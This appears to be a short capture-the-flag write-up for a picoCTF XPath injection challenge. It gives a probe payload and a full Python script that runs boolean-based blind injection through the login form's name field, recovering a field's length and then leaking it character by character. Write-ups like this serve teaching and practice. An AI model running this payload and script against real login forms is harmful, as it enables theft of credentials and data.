### X marks the spot

As the name suggests, thios challenge is X-path injection

play around with some sample queries from cheatsheets, I figured out you get a response "you are on the right path..." when your query resolves as true

this can be confirmed with a username of `' or true() or '`

This indicates we should use boolean based injection to leak the characters of various fields one by one

I scripted this, to first find the length of a given field and then leak each character

```py
#! /usr/bin/env python3

import requests, string

print("Finding len")

user = 3
field = 4

print(f"[+] Using user: {user} field: {field}")

for i in range(100):
    
    print(f"[+] Trying {i}")

    data = {
            "name": f"' or string-length(//user[position()={user}]/child::node()[position()={field}])={i} or '",
            "pass" : ""
    }
    r= requests.post(
        "http://mercury.picoctf.net:28065/", 
        data=data,
        cookies={"PHPSESSID": "bfqb6825j158rhjb111l8v6vca"},
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )

    if "right" in r.text:

        print(f'[+] found len is {i}')
        l = i
        break

alphabet = string.printable


pw_len = 5

flag = ""
#l = 5
print("[+] Password length: " + str(l)) 
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i)) 
    for al in alphabet:     
        print(f"[+] trying {al.encode()}")
        data = {    
                    "name": f"' or substring( (//user[position()={user}]/child::node()[position()={field}]) ,{i},1)=\"{al}\" or '",
                    "pass" : ""
            }

        r = requests.post(
            "http://mercury.picoctf.net:28065/",
            data=data,
            cookies={"PHPSESSID": "bfqb6825j158rhjb111l8v6vca"},
            headers= {
                "Content-Type": "application/x-www-form-urlencoded",
            }
        )
        if ("right" in r.text): 
            flag += al
            print(b"[+] Flag: " + flag.encode()) 
            break
```